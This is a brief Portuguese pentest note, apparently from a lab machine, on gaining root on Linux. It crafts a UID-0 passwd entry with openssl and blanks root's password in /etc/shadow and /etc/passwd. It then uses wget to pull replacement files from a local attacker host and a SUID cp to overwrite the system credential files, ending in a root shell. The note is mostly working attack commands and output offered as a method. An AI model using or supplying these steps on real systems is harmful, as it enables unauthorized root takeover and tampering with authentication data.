
`openssl passwd -1 -salt an4kein 1337`

`$1$an4kein$KpVTAUsL0SO0N532qSXyf.`

`an4kein:$1$an4kein$KpVTAUsL0SO0N532qSXyf.:0:0:/root/root:/bin/bash`


https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/

1- Remova a senha crypt que existe no SHADOW

antes:

`root:$6$8uypxcySfhhZ/p1p$1Sj6Bbm/gTNOqdmjVWJh9KjH/osqfXi4WQfVkoSEgL5OSKGo7cxdbQRQo.yzibIddtabSHYvDs1IbITaGTd/o.::0:99999:7:::`

depois:

`root:::0:99999:7:::`

2 - Remova o X que identifica que o user tem uma senha a ser inserida:

antes: 

`root:x:0:0:root:/root:/bin/bash`

depois:

`root::0:0:root:/root:/bin/bash`

Elevando o privilegio para root usando o cp com suid: 

```
[root@bravery shm]# ls -lav /usr/bin/cp
ls -lav /usr/bin/cp
-rwsr-xr-x. 1 root root 155176 Apr 11  2018 /usr/bin/cp
```

wget http://172.16.1.107:82/shadow -O shadow

wget http://172.16.1.107:82/passwd -O passwd


LFILE=/etc/shadow
echo "$(cat shadow)" | cp /dev/stdin "$LFILE"

LFILE=/etc/passwd
echo "$(cat passwd)" | cp /dev/stdin "$LFILE"

```
bash-4.2$ su root          
su root                     
[root@bravery shm]#
```
